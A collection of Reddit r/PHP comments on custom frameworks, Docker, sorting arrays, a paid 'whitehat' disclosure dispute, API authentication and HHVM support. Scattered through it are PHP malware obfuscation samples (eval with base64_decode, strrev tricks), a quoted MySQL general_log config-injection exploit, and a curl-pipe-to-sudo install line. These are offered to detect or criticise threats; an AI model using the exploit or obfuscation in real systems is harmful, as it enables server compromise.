I definitely agree with you on this one, don't do it! Unless it is a micro-framework or for a specific purpose. I too have had to support and maintain a custom in-house framework for about 6 years, and the maintenance is never-ending. Admittedly, there is a lot of legacy and very old code with very old ways of doing things in this one, but it can throw up all sorts of challenges that you would never have expected. The 2 biggest gotchas I have found are: * Consistently finding and fixing bugs or issues, many from years ago made by developers no longer here. Many that amaze me haven't come up years earlier! But that's the other part of this gotcha, changes made to a framework nearly always cause problems with legacy code or usages, many that won't surface straight away. * You don't know what you don't know. By this I mean there are always advancements and better ways of doing things in software development. Unless you are really on top of it, you don't always know what you might be missing or doing wrong. Particularly when it comes to the security side of things. You could have vulnerabilities that weren't known about when first coded, and unless you find out about something then go back and fix it, it could be hanging around for years to come. There are so many great PHP frameworks out there now, as someone said to me once "you're standing on the shoulders of giants" when you use an existing community driven framework. When multiple experienced developers from different backgrounds can solve all of the common (and not so common) issues with development and put it into a framework, you can never compete with that scale and experience by yourself.
&gt; Indeed, but sending a query off to MySQL is parallel. Node is the keyword here (at least in context of what you said). So, right - but only parallel if it's also async. Otherwise (since this is /r/php) a vast majority of the time your code will be synchronous as it waits for the database to respond before it proceeds with anything else (notwithstanding any asynchronous PHP database libraries which I admit I've not heard of). 
License to have PHP classes that generate loads of javascript, that draw graphs, for a fee.
Sounds like a [grey hat](https://en.wikipedia.org/wiki/Grey_hat) to me. A white hat would practice responsible disclosure.
But, that's me. I suppose it is risk assessment time... How much damage can some random script kiddie do in a financial sense? Is the fee requested less than that figure?
Tilde is a horrible alternative. Requires modifier keys to even write in many languages. And it is used for unary negation in more than one other language. Use sybtax highlighting if you can't see the difference between string literals and thr concatenation operator. I have my string literals toned down in a color similar to the background so I don't focus on them too much.
Once you've dug through the logs to see anything wonky you should probably give something like [Arachni](http://www.arachni-scanner.com/) or another automated security testing program a go. They won't catch really complex things, but they will let you know about most things a script kiddie would try and aren't that hard to setup or run.
Also just caught this, you recently started managing the site, I would see if the "Whitehat" is whoever was managing it before you looking for a few extra bucks.
Oh, thank you! As slim as the chance may ever be, better segment just in case...
I'm on version 3 of my "attempt" to roll my own framework. That said, much has changed and many lessons were learned in the previous two versions. &gt; What would you consider the biggest gotcha's that you wish you would have known before you started? In the earlier versions I locked myself into a configuration paradigm that was extremely limited. It may be the case now that it's too unlimited, but I'm OK with that. Also, events feel not very useful and mostly a waste of time. &gt; What aspect(s) of your framework took the longest to complete? It's broken down into very discrete components now. I don't think any particular component took me significantly longer than the other, although I still struggle with the best way to do auth which is partly why I've not released a more stable package for that. &gt; What aspect(s) are you most proud of? Configuration and bootstrapping.
Reminds me of what happened to PHP newsgroups in the early 2000. went from really interesting questions to "hey! How do I make a (forum|guestbook|newsletter tool) in PHP?
Cool, just about today I was needed a little development server on my notebook for a course on Symfony and I didn't wanted to install the whole stack so I started looking for docker. Thank you very much!
&gt; The company didn't take too long after i left to replace everything i did with Wordpress. Thats because Wordpress is common knowledge. They could hire almost anyone and they would already know how to use it. Your snowflake of a framework wasn't that easy to pick up and basically became technical debt from day 1.
Would that fee fix all the holes and plug all the back doors? We have no evidence it will. 
Do you really think this shitspam will live long enough to earn you a buck?
Has anyone rolled out docker at scale yet? I see most people using it at a dev level (I have as well for my local development) but every shop I freelance for never use it in production.
There is no way to hide the initial request, it has to be sent in plain text. As enygmadse stated you can send this over SSL, whilst this encrypts the data, holes have been found in SSL before so it doesn't 100% guarantee its secure but its the best there is and is generally accepted in the industry. I think you should look at JWT for this scenrio. oAuth would be fine but maybe overkill for a single app accessing a single back end
Where do you get the data from in the first place? If it's sitting in some kind of database, just handle the ordering there.
Sure, so what I'd like is to be able to make an array of ID's from my table in the database: E.G. &gt; array('502','466','471','487','464','490','495','492','501','484','499','489','468','481','497','473','498','503','504','470','496','486','465','472','500','491','485','479','483','494','463','467','476','477','488','480','493','475') Then I'd like to be able to take those ID numbers and have my data sorted in that order (not ordered in ascending or descending numerical order, but the order that my array is in). Does that make sense at all?
It is in a database, but I can't do the custom ordering I want to do there as the content of the table is used across multiple sets of data and the order has to be different for each results set that I show.
Been doing a lot with CI in the past and moved away from it. When I check out CI4's code, the poor quality and vague coding style still annoy me a lot. Come on, still no PSR-2? Come on, [still a big pile of mess for every incoming request](https://github.com/bcit-ci/CodeIgniter4/blob/develop/public/index.php)? Still require_once'ing your own libraries and not using (Composers') excellent autoloading technologies? I appreciate their efforts but I think it is a waste of time. 
I used it in production for my personal website and had fairly good success. I say fairly, because I went live with NGINX, PHP and MariaDB containers and everything went live successfully. However, if I restarted Docker or my server for any reason and started up my containers again, the local IPs wouldn't always stay the same. My NGINX conf file would connect using hardcoded docker IP addresses, so if Docker changed them, my site would go down. Also, something was up with my file permissions so every time I updated my site (running OctoberCMS, it would go down due to not being able to update a certain file/folder). The issues I have had are clearly my own fault and was due to lack of knowledge, since that was the first time I ran with Docker and didn't know a single thing about it beforehand. Since then, I have started to use Forge and so far, I have had pretty much no issues with having it run my server. I would really like to go back to Docker and use it going from dev to production. Especially for my OSS projects I'm currently on since it would make it so much easier for others to roll the projects and see how they work then go live in a matter of seconds.
Nope.
Like this? $databaseData = [ [ "id" =&gt; 1, "sortIndex" =&gt; 2, ], [ "id" =&gt; 2, "sortIndex" =&gt; 3, ], [ "id" =&gt; 3, "sortIndex" =&gt; 1, ], ]; uasort($databaseData, function($a, $b){ return $a['sortIndex'] - $b['sortIndex']; }); var_dump($databaseData);
Maybe your .git folder is exposed, try this: http://www.yourdomain.com/.git/HEAD
Good answer. The alternative, if you need an actual sorted array, would be something like $sortedData = []; foreach($indexes as $index) { $sortedData[] = $data[$index]; } // now do whatever you want with $sortedData Using usort as others have suggested is also viable, but it seems more complex and inefficient to me as in the sort function you'll need to look up two array indexes with `array_search` every time.
&gt; But if you query for the IDs in a certain order, that array is already in the order you want it Are you talking about using `WHERE id IN (...)` in MySQL? Because the ordering is not guaranteed in that case.
tried to use Docker in production last year, it was a small website and i used Tutum to manage the containers. Everything was going fine until deadlocks started and containers got unresponsive, i was unable to restart them. Since then i'm waiting until Docker is more mature and more used for small scale, not for giant clusters of servers
Couple yourself to one implementation! But seriously it's not a library php-curl is an extension and not a library. Also majority of these libraries will use curl while for example in the case of Guzzle at least roll over to use another method if curl isn't available. 
A man is not standing nor in my home. He sent a letter to the office of a wannabe startup you are running thinking to make a lot of money from unsuspecting users. You guys seems can't tell a racket from a pen-test. From what I can tell, that white-hat guy never threatened the OP. This is the difference you greedy communists living in the imaginary world just unable to get. You want to have everything for free, but accusing others for asking money for their job.
So you are adding code in PHP and JS. Why is this not a JS only app like Disqus? Something like https://posativ.org/isso/ but in PHP would be nice.
Good advice.
&gt;security is not in the budget You are literally fucking yourself.
Resets can be exploited for denial of service attacks. I can change your password whenever I want just by knowing your email address. Expiring generated passwords is also a pain. You have to keep track of whether a password is user or system generated, how long it's valid for, and expire it immediately after use. So if you're essentially implementing all the features of a token system along side your passwords why not just cut out the middleman and directly use reset tokens?
Add in `eval()` as well as as searching for all of those previously listed but reversed. Some scripts are using `strrev()`in combination with any of those commands you've listed. For example, a bit from a script will have in a string: (edoced_46esab(lave Usage of code that's obfuscated is a common tactic: $noprrv="\x63"."r"."\x65".chr(97).chr(116)."\x65"."\x5f" There's also an obfuscation tactic where every letter is assigned to a variable: $boasting= 'r';$astatine='e'; $blowup = 'Q'; $dungeons='a';$dales ='l(eGc:q'; Which is then pieced together into a string: $ganny=$boasing.$dungeons.$dales[3] - etc --------------------- Look in *every* folder for files that are named "oddly", like asdfadfs.php, or similarly like dungeon-zeus.php. Also files that that have _old naming, or makes it look like a file has old-school "versioning"; for example index_old.php
This is exactly what I would expect. Thanks for spelling it out with real work examples.
It's no wonder because Americans have quite a vague idea of communism in general. And you just have no idea how lucky you are for that. 
Honestly, I don't feel like you're asking the right question. Just because I tried Python, and Node, doesn't mean I ever left PHP. I use the right tool for the job. I have projects in Bash, Python, Node, Rails, PHP, etc. When I take on a new project or tackle a new idea, I always consider the goals and requirements and decide on a stack that is most appropriate. I will say, I prefer PHP over other stacks like ASP.NET MVC or Rails simply because I've got the most experience with it. Started in 2001 on PHP 4 and have used it ever sense, so it's my strongest. 
if I read it correctly you also need sql injection to write to the file, not sure if I got that right.
What? It's not his job if he's just randomly pen-testing sites. You can't do that any more than I can check your house security without you asking. It's illegal, and implicitly threatening - that's the point of my metaphor. BUT you are right, this guy might not know this; he's just being a helpful dude trying to make a living; we can't really tell from the story given. But that doesn't change the fact that it is illegal. (If the whitehat was commissioned to do this, then absolutely he should be paid!) I'm not not sure how you've decided I'm a communist though because I don't think you should be paid for hacking random people's websites?
pretty sure it's not "doing things for free" which is also part of capitalism
True, but for instance, Disqus: &gt; ...However, the system makes use of iframes to directly communicate back to the Disqus servers when users post content. _[Disqus](https://help.disqus.com/customer/portal/articles/466187-how-does-disqus-work-)_ So, even with well-established tools such as Disqus, there is still a server running in the background. My approach takes advantage of PHP (I know, it's a server), but it does not use a DB server, such as MySQL or MSSQL or Postgres, and hence is flat file.
&gt; Wrong. A good mechanic would tell you that "X part needs to be replaced" and offer to replace it for you. Generally you take your car to a mechanic, a mechanic doesn't just show up one day.
&gt; A white hat would have told you what the vulnerability is; you have an extortionist. I'm inclined to agree with the latter point, but not the former point. In this case: The person was asking for money for a trivial issue that led to the source code being leaked and that's bad. However, I don't agree with your definition of a white-hat. A white-hat might have said, "Your source code is accessible via [git url here]" instead of the smoke and mirrors with the screenshots of the source code, but turned around and offered to find *other* problems with their code/deployment process for a fair market rate. Personally, I wouldn't do this, because it always *looks* like extortion, but I know many people who have done this in the past. I'm more of a "tell them about X and leave it at that" sort of security person. (I also don't test systems without a contract written up first.)
I once tutored a guy that was learning PHP. I had him using my framework, gave him a little brief insight into it, and all was well. About two months later, he got a job where he was exposed to Wordpress (admittedly more than just a framework, but it's the example I'm working with). He asked me WTF was wrong with the planet. There are some really good frameworks out there, but there's also some really bad ones. And yes, in live production, it would be nice if everyone made a sensible choice to go with a good framework. But just because something is open-source doesn't mean it's a better solution. Part of the problem with many open-source choices is that there's too much muddled nonsense that gets patched on top of each other from people that never go back and revise. There are plenty of reasons to work with custom solutions, some of which is just a learning process if nothing else. Besides, those good frameworks didn't create themselves.
https://www.shimmercat.com/en/docs/1.5/installation/ curl -s https://www.shimmercat.com/install.py | sudo python - # NO THANKS
WHAT THE FUCK Attacker could run the following SQL queries: mysql&gt; set global general_log_file = '/etc/my.cnf'; mysql&gt; set global general_log = on; mysql&gt; select ' '&gt; '&gt; ; injected config entry '&gt; '&gt; [mysqld] '&gt; malloc_lib=/tmp/mysql_exploit_lib.so '&gt; '&gt; [separator] '&gt; '&gt; '; 1 row in set (0.00 sec) mysql&gt; set global general_log = off; The resulting config would then have the following part appended:
If you're allowing arbitrary external SQL queries you're already fucked.
highcharts wrapper that doesn't acknowledge its using highcharts. Unscrupulous. Avoid. 
Huh? Ill have what he's smoking! Don't do string concatenation, period. (Pun intended) compose strings using double quotes and variable placeholders instead. ex: "Hello {$var}"
I remember checking back when I wrote https://seld.be/notes/php-versions-stats-2016-1-edition - HHVM traffic on packagist was (across all versions) 1.6% back in June. That is less than PHP 5.3, and tbh probably mostly comes from TravisCI build runs. If it runs great, but I would not go out of my way to support it.
s/security/ransom/
Someone else on one of the projects mentioned it and made some changes to the configuration matrix to use a more recent version. Personally I don't explicitly test for or support HHVM beyond turning it on in Travis, so I'm not really concerned with what version it's running in all honesty. For me it's one of those novelty "hey, this works according to the test suite but use at own risk" type things.
You are missing the point of shared servers, now even if a site in your host is open to injection the attacker can also get to you and all other databases. 
Asking as a noob who has spent a whole 3 hours learning Angular - what's the down-side to doing one way binding?
If your package aims to support any versions in the 5 series I recommend supporting HHVM. I am less familiar with their PHP 7 support but honestly I'd be worried if PHP 5.X code can't run on HHVM at this point.
We dropped official support for it because it doesn't have feature parity with PHP 5.6.
Wow how hostile, except that every engineer in that company was capable of picking it up as I involved them in the design of it from day 1, but I dont blame you for not knowing that as I didn't say it anywhere. But you are right, that is the precise reason they went to Wordpress, and then banned anyone ever deviating from Wordpress going forward. No, your simply not allowed to use anything other than Wordpress, even other common knowledge pre-packages CMS's. But this is also a company that was so scared of SCM even after a virus blew away every project aside from the ones we committed to git on the sly, so frightened of employees wearing headphones because it may somehow 'distract us' and as such banned them. So fearful of being questioned they absolutely refused to allow engineers to take part in the meetings that involved the design **and** architecture of projects despite everyone else being in that meeting. So fearful of change that every project was managed through Windows Notepad and the concept of a Kanban board scared the hell out of them. So terrified of a mutiny that the CEO and Lead Designer banned employees from talking to eachother during work hours and at least 3 hours after the shift ended. This is a company that trusts Wordpress as the life blood of the company and the silver bullet to every single project, and never explores any other options even to this day. 
&gt; Wrong. Say your car has a problem you don't even know. A mechanic spots it. Do you ask him to explain how to fix the problem, what tools you will need? No, you leave your car with him so he fixes it, and then you pay. The mechanic spent time and money learning how to fix cars. So did the whitehat learning how to spot vulnerabilities in websites. A mechanic would tell me hey it looks like your alternator is going out. 
How would you improve the website? Is there anything about it in particular that you don't like? Offline-usage hasn't been implemented yet (I'm targeting online applications such as PHP scripts while I get on my feet), but the basic idea will be as follows: A product has a public key and a private key. The private key is kept secret on the server, while the public key is available to the user and can be included with the product. This has been implemented now and is currently used to verify the response from the licence server. Offline licences will work something like as follows: the server signs the expiry date (and a few other details) of the licence using the private key. The software can download this signed expiry date as well as a standard expiry date in plaintext and store both of them. The product can use the public key to ensure that the signed expiry date matches the stored expiry date, and if one of them doesn't match then the product will display a message / not function / other behaviour. If the product can't find the signed expiry date or it's been corrupted in some other way, the client will have to go online to retrieve it from the server again. Some things to consider with this is that if the application is truly offline then you will have to rely on the client for the current date/time, which is less secure than getting the date/time online. One thing the client could do is store the date/time each time the application is started and if the date/time moves backwards then the application can take some action to try and prevent tampering (IE: moving the system clock back so the expiry date is never reached). As I said, this hasn't been implemented yet since I'm focussing on applications that will have an internet connection while things get going, and it needs some more thought and planning before implementation, but hopefully this gives you an idea of how it would work. Thanks for the feedback :)
Have you got a link to one of the projects that have a recent HHVM version? My project fails on the old version of HHVM that Travis has by default, and I know it works on the latest release.
Sounds like a great idea! Thanks! I'll have a think about how best to implement offline licensing. The behaviour of the software if it's unable to reach the licence server is ultimately up to the developer implementing the library (at least for short periods of time). They can choose whether to immediately disable the application, or allow a certain number of licence verification retries / period of time before disabling the application. All the libraries and service does is provide an easy way to check that a licence is valid and that the response has come from a valid licence server. It's in the hands of the developer what to do if the client can't reach the licence server (whether that be due to a technical fault on the server-side, or through an attempt to thwart the licensing system by a customer). As part of the bigger picture deliberate offline behaviour will be considered for long periods of time, however I expect this will behave differently to short periods of down-time. 
What kind of documentation? API or general? For APIs, the world around swagger is worth a look: http://swagger.io/ For general documentation, maybe Read the Docs? https://readthedocs.org/
Still need to be able to test the function. Sure I could add an else block after and have fake output as if the function existed but at that point I'm coupling testing to my implementation which is bad practice and makes code less maintainable. 
Unless I'm reading this document wrong, taking away everyone's FILE permissions would also be a solution. Is that true or am I missing something? &gt; As over 40 days have passed since reporting the issues and patches were already mentioned publicly, a decision was made to start disclosing vulnerabilities (with limited PoC) to inform users about the risks before the vendor's next CPU update that only happens at the end of October. &gt; &gt; No official patches or mitigations are available at this time from the vendor. So basically, people have chosen to put a serious security risk out there for everyone to read about, fully aware that everyone running a standard Linux server will be vulnerable for well over one more month. Anyway, thanks for letting people know about this, OP! The more people who know about this the better, especially now that this is out in the open.
... Wordpress is a danger to itself and society.
You could obfuscate the code which makes it a bit harder, or you could force use of an encoder for the entire application. Kind of defeats the purpose of PHP if you encode the application, but it would work. Something like IonCube comes to mind. 
Again, it's up to the developer to take measures to ensure the licence protection isn't simply commented out. Normally I would suggest a solution such as ionCube to encode the PHP source code. While ionCube does have some licensing capabilities inbuilt, it does not have these in its base edition and they're not as flexible as what enverido offers (or will offer as development continues) - ionCube can only license using license files. Other solutions would be available - for example some sort of obfuscation software or another encoder such as Zend. This would be less of an issue when we move to compiled languages such as Java and .Net, which are more difficult to reverse engineer. To answer your latency question: this depends how the developer implements the library in their application. If they requested a licence check on every page load then it would, yes. I'd suggest only verifying the licence for specific requests. An example of this would be during the login process (particularly for an administrator / staff member), and it could also be run as a scheduled task in the background. We're not trying to offer an end-to-end solution or jack of all trades type solution for complete protection of an application from any tampering attempts and the developer will still have to be diligent with their software and their implementation of enverido. That's why we don't provide some kind of obfuscation service, or account management service within enverido. Instead, we want to focus on being able to easily integrate with services that already do this well, while we focus on getting the licensing right. Similarly - I'm not trying to present this as a finished product in any way yet, just at a point where it's functional and things are working and testing and feedback would be great! Hope this clears up some of your questions!
Yes, but SQLI doesn't normally turn into RCE. Of course, presumably you could do the same thing to add an entry into `root`'s `authorized_keys` file and own the server that way (assuming it's not properly isolated from the network and only accessible through an SSH bastion), it's just a little less automated and would require more work to cover your tracks. The problems demonstrated appear to be mitigated by having good configuration choices: `root`-owned config files chmod'd to 600, and having the application's database user have limited privileges (CRUD only if even that, no administration, alter, **file**, etc). So arguably, the issue isn't so much this exploit as the fact that mysql startup fails to require good file permissions. The linked POC didn't link the patches that Maria/Percona produced so I don't know if that's all they did to mitigate the issue or if more was performed.
Just use file_get_contents() seriously, I don't get why people need to add 200 code files as a dependency just to do an HTTP request when PHP already allows to do that.
[There's an entire subreddit for that](https://www.reddit.com/r/InternetIsBeautiful/)
See https://github.com/php-ds
there's a 3.15 release on github but no blog post or changelog. It seems HHVM is slowing down...
The fact that 7.0 support on HHVM is non-existing led me to drop it for now. I'm moving my packages to 7.1, so I don't see a reason to keep support for newer major versions.
I think we can all agree that the Wordpress codebase and API is wtf, but I'm just putting on of the many arguments against maintaining a custom framework out there.
The downside is that if you ever modify the variable that you are displaying on the screen via one way binding, it won't update. It is stuck displaying whatever the variable's initial value was. If you know that your array/object/string/etc will never update on a particular view then it's safe to do a one way binding.
I think IonCube comes with license protection features by default, Making a project like this oboslete
This is exactly why we keep that stuff in Docker (or other) containers.
file_get_contents * does not return the HTTP status code * it won't let you read headers * won't let you fire multiple simultaneous requests * is synchronous * can't be used with REST services because it returns false on 4xx and 5xx status codes There's probably more.
Obviously you never used it more than 30 seconds: - $http_response_header will give it to you: http://php.net/manual/fr/reserved.variables.httpresponseheader.php - Yes, they are in $http_response_header - no - yes, just like every other PHP function - wrong, use ignore_errors option and you will get the right result cURL has advantages yes, but most people don't even read the PHP docs and don't know how to use streams in PHP, and they are very powerful. This is sad.
When I've been managing servers for people (not my own code) I seen a huge burst in people going down a HHVM route for their projects but over the last 12-24months the trend is to not use HHVM and use opcache instead
IonCube....... I'm out
I just can't see a use for this project over the huge number of already available commenting systems. What was your aim for this project? What gap does it fill in the market?
&gt; I tried creating a bootstrap script in the PHPUnit configuration that would define a fake foo function and then require the Composer autoloader, but my main script still thinks foo is not defined. If I understand this correctly you created a bootstrap.php &lt;?php function foo() { return 'something'; } require 'vendor/autoload.php'; then in phpunit.xml you have &lt;phpunit bootstrap="./bootstrap.php" ... and when running tests, function_exists('foo') still returns false? are you sure phpunit is using the correct phpunit.xml?
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
How do you use it in unit tests?
ionCube wouldn't necessarily be the only solution to protecting the source code, it's just one that came to mind.
I don’t know if I understand the problem correctly. So you have a function factory: class BazFactory { public function createBaz() { if (function_exists('foo') &amp;&amp; ! function_exists('baz')) { … } } } And you cannot test it because it relies on a global state? How about getting rid of the global state dependency: class BazFactory { private $fooChecker; private $bazChecker; public function __construct($fooChecker = 'function_exists', $bazChecker = 'function_exists') { $this-&gt;fooChecker = $fooChecker; $this-&gt;bazChecker = $bazChecker; } public function createBaz() { if (call_user_func($this-&gt;fooChecker, 'foo') &amp;&amp; ! call_user_func($this-&gt;bazChecker, 'baz')) { … } } } So now you can manipulate the existence / nonexistence of the functions in your test suite: $factory = new BazFactory(function () { return false; }, function () { return false; }); 
This has been fixed some time ago -- there should not be an ini option that controls this now.
What? Just like any other PHP code?! Why would stream wrappers be different or couldn't work with unit tests?! I don't understand that question.
One way or another you always send authentication with every request, because requests are stateless. The only semblance of state we have are cookies. And how do they work? Well... they're sent with every request. I personally use standard random tokens, not JWT. You authenticate at an API, it returns a long enough crypto-safe random sequence (think of it as a session id), and then I keep sending that token with every request. The service that interprets the token is accessible to any server that needs it, and the results can be cached in the short term (depending on business rules). Also make sure your parties are communicating through HTTPS, not HTTP.
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/phpsec] [What is the best\/most recommended way of authenticating between two servers? (xpost from \/r\/PHP)](https://np.reddit.com/r/phpsec/comments/52vzan/what_is_the_bestmost_recommended_way_of/) [](#footer)*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))* [](#bot)
**TL;DR** Give each task to the person who's best at it... That is not news to most people, I think, but the author claims it is.
Sounds logical. I'm not using Angular or sth. like that. The requests from the frontend to the backend are made through PHP.
The benefit with using JWT tokens is that you get additional context that a single hash-only token can't provide. I'd definitely at least check into them before just choosing a straight up hash, especially if the project is relatively greenfield.
I didn't mention a hash. Nothing is being hashed. It's just a random token id, and that token can have plenty of context associated with it, but it's simply not included in the token id being sent over the wire. JWT carries the context in itself, encrypted, and a random token id merely points to that context (which can be obtained from the identity service that generated the token). JWT is self-contained, but it's big (compare 700-7000 bytes vs. a token id of 32 bytes), and in some cases [vulnerable to information leaks and forgery](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/). So, you know. Pros and cons. JWT has both.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
You mentioned a "token" and I assumed it was a randomly generated hash of some sort being used as the identifier. My fault on assuming if that's not the case. And yes, JWT have their downsides too - thanks for linking to that auth0.com article too, some good information there.
does that mean each authenticated user gets a PHP session? If so, you could share sessoins between front and back end pretty easily and make sure the session_id is part of the request from the front end server to the back end server. You *may* need to implement a simple but custom PHP session handler.
Naturally! And preferably in conjunction with some base64 encoding: eval(base64_decode("dmFyX2R1bXAoX19ESVJfXyxnZXRfZGVmaW5lZF9jb25zdGFudHMoKSxnZXRfZGVmaW5lZF92YXJzKCkpO2V4aXQ7")); (/sarcasm off: Don't **ever** use `eval` and **don't EVER** implement the above code)
Are you planning on doing A or B? A: User [TOKEN] -&gt; Frontend Server [TOKEN] -&gt; Backend Server [TOKEN] B: User -&gt; Frontend Server [TOKEN] -&gt; Backend Server [TOKEN] For situation A, your user provides the authentication token (JWT etc.) which is carried over to the backend server. For situation B, your frontend server authenticates to the backend server. If the TOKEN needs to be used for both the frontend service and the backend service (rather than just forwarded blindly): Read [don't use JWT for sessions](http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/). Alternatively, situation B can be solved by `hash_hmac()` and `hash_equals()`. Or, if you're authenticating a lot of frontends-- some which you don't control-- against the same backend for different clients, grab Halite and [use it for digital signatures](https://paragonie.com/blog/2016/05/solve-all-your-cryptography-problems-in-three-easy-steps-with-halite#asymmetric-sign).
A "session" in the PHP sense of it comes with additional attributes, which aren't necessary here, like: 1. There's a single server that the session exists at. Problem if you need multiple services authenticating against a token. 2. Using cookies for the token is an unnecessary complication when you have no browser involved. 3. A session's state is blocking. Means if you issue two requests with the same session, one blocks and waits for the other to complete. So while it may be described as "just a session", because it's built into PHP, it's the more complicated and limiting option for the use case presented here. There are ways to work around each of the items here, with custom session initialization and custom session handlers, but then it's no longer "just a session", it's something else.
[GitBook](https://www.gitbook.com/) seems to fit your needs.
I already answered this: https://www.reddit.com/r/PHP/comments/52vx72/what_is_the_bestmost_recommended_way_of/d7nqkbh
We basically sit down, and talk. :-) The app is split in modules, and we come up with a rough API that each module should implement. Whoever can provide a most efficient solution and feels most confident about it, takes the module. People are pretty good at common sense in a relaxed setting. I've not seen someone take on disproportionate amount of work, or take on modules they have no clue how to implement. Development is an interesting discipline. It sits right between research and production. No matter how many Methodology books you read, you'll never find a perfect algorithm for producing something that involves substantial creative effort. So in these situations, the best you can do is assign clear responsibilities and have clear communication. If your people are good, the rest of the pieces fall in place. If someone has a problem with that, maybe they should manage a McDonald's venue, not a software shop. There everything is far more predictable.
I'd also throw in my vote for camelCase. I use it for both functions and variables, to me it's a few less characters than snake_case and it looks better, but that's mostly preference. It is a sort of industry standard I suppose, but it just looks best to me too.
Right, I just think you are making a lot of assumptions and in general I like measuring over guessing because that compensates for any cognitive biases. It's easy to assume that work is going well if you ask people how they feel and if they have any blockers, but that doesn't tell you that in fact the guy working on emails is much better at setting up logging than the person currently doing that, and so on. A lot of managers decide and assign without getting visibility on the capabilities of their team. And then it's on the devs to call him out on that, and if you value your job you might prefer to avoid conflict. Another assumption is that people don't take too much work. I don't know any devs who think they are slow or not great at their job, so in general people overvalue themselves. There is a wide gap between having no clue and being an expert, and if you're more or less in the middle you're not going to say that it's best someone else do the task.
So why would a dev use this and not WP?
It is the decorator https://packagist.org/packages/gloomy/twig-decorator-bundle - I believe it is related to that. 
Whoever produces the estimates decides what date to say. If there's misunderstanding about terms, the team can adjust their "estimate date" accordingly and produce a conservative number. But one thing I can't accept is to observe communication failures between your team and the management, and do nothing about it, except hold grudge because management doesn't get it, or something. 
Are you using Twig/Twig at all? **EDIT:** Check out the Twig docs, especially the following: [Twig for Template Designers](http://twig.sensiolabs.org/doc/templates.html) and [Twig for Developers](http://twig.sensiolabs.org/doc/api.html). From the developer side, it look like this: require_once '/path/to/lib/Twig/Autoloader.php'; Twig_Autoloader::register(); $loader = new Twig_Loader_Filesystem('/path/to/templates'); $twig = new Twig_Environment($loader, array( 'cache' =&gt; '/path/to/compilation_cache', )); And then render the template: echo $twig-&gt;render('index.html', array('the' =&gt; 'variables', 'go' =&gt; 'here')); So if you had a template that displayed a product that the view could buy, you may have variables such as $productName, $productPrice, $productSKU, etc. and then when you rendered the template you'd have (in shorthand): [ 'templateVariable1' =&gt; $productName, 'templateVariable2' =&gt; $productPrice, 'templateVariable3' =&gt; $productSKU ] The 'templateVariable#' matches the {{ variableName }} format from the template itself. If I can, I try to match variable in the template with the PHP variable name: [ 'productName' =&gt; $productName, 'productPrice' =&gt; $productPrice, 'productSKU' =&gt; $productSKU ] 
&gt; Right, I just think you are making a lot of assumptions and in general I like measuring over guessing because that compensates for any cognitive biases. You can measure, but what are you going to compare your measurement to, exactly? You can't compare apples and oranges, you can compare only apples to apples. But in development it makes no sense to do the same exact task twice, because we can reuse our previous work if it were the case. So one should be careful not to start focusing on what's *easy to measure*, versus what *really matters*. When developer productivity is vastly different from one employee to another, it's observable with the naked eye. Major differences in quality are also observable with the naked eye. Any more granular measurements serve no purpose. I won't fire someone because they accomplish a task 30% slower, would I?
&gt; Try writing a synchronous AJAX call. I'm not even sure if you can. It's difficult. The *reason* why this is, is that because node.js is conceptually built with the mindset to be asynchronous first, synchronous second. So, it's an *extremely* common design pattern to structure API's using this technique. That is, the API's for libraries are typically setup to accept a `callback` parameter (or returns a promise) which is executed (or fulfilled) later once `[x]` finishes. As a result, often times the *synchronous* methods take a back seat and either aren't built, or if they are, they are then instead built out and named as such (e.g. see [internal file system API](https://nodejs.org/api/fs.html), where all operations are asynchronous by default with synchronous operations being the ones with the `-Sync` suffix). Therefore, as far as I'm concerned, it being "not possible" simply means people just don't build the API for it. The reason why node.js is so fast is that it's more efficient by proxy of those core design patterns/methodologies which prioritize asynchronous operations (or, callbacks) so that you can structure your code to continue doing other stuff instead of waiting all the time.... That being said: I think that's why people confuse it for being parallel, because while they write code to "do stuff" they conceptualize the callback functions as sort of executing/existing in another thread (or something) instead of realizing that it's actually part of a core [event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) that just plops your closures into a heap and eventually finds it's way into stack once it's time to pull it out of that heap and executes it **synchronously as it goes through the stack** :)
WP doesnt say "a blogging platform for devs", so whats wrong with the question? Its a "blogging platform for devs", so what makes this a platform for devs? The shallow 5yolds on this "community" is starting to annoy the big jesus out of me
The fact that it's built on a proper framework with a real ORM that supports a proper relational DB structure, PSR-4 autoloaded environment, router, and template engine. Even the most diehard Laravel hater should concede that Laravel is orders of magnitude more developer friendly than Wordpress....
Canvas looks good out the gate. WordPress takes some pretty heavy customizing or premium theming to even start to look modern and appealing. WordPress has quite a bit of configuration that can be daunting to new devs, and is just plain tiresome to old devs. The installation process for Canvas is simple enough that even new developers or non-Laravel developers can jump in and write a nice looking blog. 
He highly recommends run kit though
Postman is a decent web app for testing calls. It's in the chrome web store
If you are talking API docs, I use and recommend Slate. https://github.com/lord/slate
I use postman, advanced rest client or soapui.
If you could remove one function from PHP, what would it be and why?
1) We tend to start with stories and break them down into various ticket types: discovery, lo-fi (wireframing/workflow dev), hi-fi (mvp prototyping), and implementation (fine tuning/config mgmt as it moves to production). This way we take baby steps to figure out what's needed and how long it will take. We tend to cap discovery to &lt; 2 days to outline an implementation plan, and note security and potential development/implementation issues. If necessary, this turns into a wireframing project where workflow / UI / state changes are diagrammed out and modeled, and everyone agrees that that is what want to happen. This generates a prototyping ticket which builds out the idea in code and leads to a demo where the product owner can see how it was implemented, and either ask for an iteration or go back to discovery. Not every story goes through the full cycle, but all of the things we've never done before do. 2) We make sure that anyone interested in a problem does the discovery. If no one is interested in the problem, then anyone can be assigned the problem. 3) Slow but no bugs is good. Assign them to high risk tickets and make sure they have support for the work they aren't comfortable with. However, if the slow guy doesn't produce, or seems to miss the point of a ticket, that seems like a problem.
most useless/broken functions are listed here: https://wiki.php.net/rfc/deprecations_php_7_1
